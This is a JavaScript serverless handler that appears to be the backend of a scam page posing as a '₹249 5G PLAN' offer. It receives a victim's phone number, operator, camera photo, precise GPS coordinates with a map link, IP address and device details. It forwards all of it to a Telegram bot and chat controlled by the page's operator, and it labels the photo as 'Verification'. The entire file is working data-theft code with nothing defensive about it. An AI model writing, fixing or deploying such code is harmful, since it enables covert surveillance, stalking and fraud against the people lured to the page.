const axios = require('axios');
const FormData = require('form-data');

module.exports = async (req, res) => {
  // CORS Headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method === 'GET') {
    return res.status(200).json({
      success: true,
      message: '✅ API Working',
      timestamp: new Date().toISOString()
    });
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed. Use POST.' });
  }
  
  try {
    // Environment variables
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const MAIN_CHAT_ID = process.env.MAIN_CHAT_ID;
    const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
    
    if (!BOT_TOKEN || !MAIN_CHAT_ID) {
      return res.status(500).json({
        success: false,
        error: 'Server configuration missing.'
      });
    }
    
    // Parse request body
    let userData = {};
    try {
      userData = req.body;
      console.log('📥 Received:', {
        mobile: userData.mobile,
        operator: userData.operator,
        hasPhoto: !!userData.photo,
        hasLocation: !!userData.location,
        locationType: typeof userData.location,
        locationData: userData.location
      });
    } catch (e) {
      console.error('JSON error:', e);
      return res.status(400).json({ error: 'Invalid JSON' });
    }
    
    // Fixed country
    userData.country = '+91';
    const USER_CHAT_ID = userData.userChatId || MAIN_CHAT_ID;
    
    // Get IP info
    const clientIp = req.headers['x-forwarded-for'] || 
                     req.connection.remoteAddress || 'Unknown';
    
    let ipInfoData = { ip: clientIp };
    
    // ✅ FIXED LOCATION HANDLING
    let locationText = 'Permission Denied';
    let hasValidLocation = false;
    
    if (userData.location) {
      console.log('📍 Raw location data:', userData.location);
      
      // Check different location formats
      if (typeof userData.location === 'object') {
        // Format 1: { latitude, longitude, accuracy }
        if (userData.location.latitude && userData.location.longitude) {
          hasValidLocation = true;
          locationText = `Latitude: ${userData.location.latitude}\nLongitude: ${userData.location.longitude}\nAccuracy: ${userData.location.accuracy || 'N/A'}m\n🌍 Map: https://maps.google.com/?q=${userData.location.latitude},${userData.location.longitude}`;
        }
        // Format 2: { status: 'Permission Denied' }
        else if (userData.location.status === 'Permission Denied') {
          locationText = 'Permission Denied';
        }
      } 
      // Format 3: String or other
      else {
        locationText = String(userData.location);
      }
    }
    
    console.log('📍 Processed location:', { hasValidLocation, locationText });
    
    // ✅ FIXED PHOTO HANDLING
    let photoStatus = 'Not Captured';
    let photoBuffer = null;
    let canSendPhoto = false;
    
    if (userData.photo) {
      console.log('📸 Processing photo data, type:', typeof userData.photo);
      
      if (typeof userData.photo === 'string' && userData.photo.startsWith('data:image')) {
        try {
          // Extract and validate base64
          const base64Match = userData.photo.match(/^data:image\/\w+;base64,(.+)$/);
          if (base64Match && base64Match[1]) {
            const base64Data = base64Match[1];
            
            // Validate base64
            if (!base64Data.match(/^[A-Za-z0-9+/]+=*$/)) {
              console.error('❌ Invalid base64 characters');
              photoStatus = 'Invalid Base64';
            } else {
              // Create buffer with validation
              const buffer = Buffer.from(base64Data, 'base64');
              
              // Check if buffer is valid
              if (buffer && buffer.length > 100) { // At least 100 bytes
                photoBuffer = buffer;
                const sizeKB = Math.round(buffer.length / 1024);
                
                if (sizeKB < 10) {
                  photoStatus = `Captured (${sizeKB}KB - Too Small)`;
                } else if (sizeKB > 10000) {
                  photoStatus = `Captured (${sizeKB}KB - Too Large)`;
                } else {
                  canSendPhoto = true;
                  photoStatus = `Captured ✓ (${sizeKB}KB)`;
                  console.log(`✅ Photo buffer ready: ${sizeKB}KB`);
                }
              } else {
                photoStatus = 'Empty Buffer';
                console.error('❌ Buffer empty or too small');
              }
            }
          } else {
            photoStatus = 'Invalid Data URL';
            console.error('❌ Not a valid data URL');
          }
        } catch (bufferError) {
          console.error('❌ Buffer creation failed:', bufferError.message);
          photoStatus = 'Buffer Error: ' + bufferError.message;
        }
      } 
      else if (typeof userData.photo === 'object' && userData.photo.status === 'Permission Denied') {
        photoStatus = 'Permission Denied';
      }
      else {
        photoStatus = 'Unknown Format: ' + typeof userData.photo;
      }
    }
    
    // Build Telegram message
    const message = `
💰 *₹249 5G PLAN ACTIVATED*
📱 Mobile: +${userData.country.replace('+', '')}${userData.mobile}
📡 Operator: ${userData.operator}

🌐 *IP Information:*
🌐 IP Address: ${ipInfoData.ip}
📡 ISP: ${ipInfoData.org || 'Unknown'}
📍 City: ${ipInfoData.city || 'Unknown'}

📱 *Device Info:*
🔋 Charging: ${userData.deviceInfo?.battery?.charging ? 'Yes' : 'No'}
🔌 Battery Level: ${userData.deviceInfo?.battery?.level || 'N/A'}%
🌐 Network: ${userData.deviceInfo?.connection?.effectiveType || 'N/A'}
🕒 Time Zone: ${userData.deviceInfo?.timezone || 'N/A'}

📍 *Location:*
${locationText}

📸 *Camera:* ${photoStatus}

⏰ *Time:* ${new Date().toLocaleString('en-IN')}
    `;
    
    // Send to Telegram
    const chatIds = [...new Set([MAIN_CHAT_ID, USER_CHAT_ID].filter(id => id))];
    const results = [];
    
    for (const chatId of chatIds) {
      try {
        console.log(`📤 Sending to ${chatId}...`);
        
        // 1. Send message
        await axios.post(
          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
          {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
          },
          { timeout: 10000 }
        );
        
        console.log(`✅ Message sent to ${chatId}`);
        
        // 2. Send photo if available (FIXED METHOD)
        if (canSendPhoto && photoBuffer) {
          try {
            console.log(`🖼️ Sending photo to ${chatId}...`);
            
            // SIMPLIFIED: Direct upload without FormData issues
            // Convert buffer to base64 for Telegram
            const base64Image = `data:image/jpeg;base64,${photoBuffer.toString('base64')}`;
            
            await axios.post(
              `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
              {
                chat_id: chatId,
                photo: base64Image, // Direct base64 string
                caption: `📸 Verification for ${userData.mobile}`
              },
              {
                timeout: 15000,
                headers: {
                  'Content-Type': 'application/json'
                }
              }
            );
            
            console.log(`✅ Photo sent successfully to ${chatId}`);
            
          } catch (photoError) {
            console.error(`❌ Photo error to ${chatId}:`, {
              message: photoError.message,
              response: photoError.response?.data
            });
            
            // Alternative: Send as document
            try {
              const base64Image = `data:image/jpeg;base64,${photoBuffer.toString('base64')}`;
              await axios.post(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
                {
                  chat_id: chatId,
                  document: base64Image,
                  caption: `📸 Photo for ${userData.mobile}`
                },
                { timeout: 15000 }
              );
              console.log(`✅ Photo sent as document to ${chatId}`);
            } catch (docError) {
              console.error(`❌ Document also failed:`, docError.message);
            }
          }
        }
        
        results.push({ chatId, success: true });
        
        await new Promise(resolve => setTimeout(resolve, 500));
        
      } catch (error) {
        console.error(`❌ Error to ${chatId}:`, error.message);
        results.push({ chatId, success: false, error: error.message });
      }
    }
    
    res.status(200).json({ 
      success: true, 
      message: 'Data processed successfully',
      location: hasValidLocation ? 'Received' : 'Missing/Denied',
      photo: photoStatus,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('❌ API Error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
};
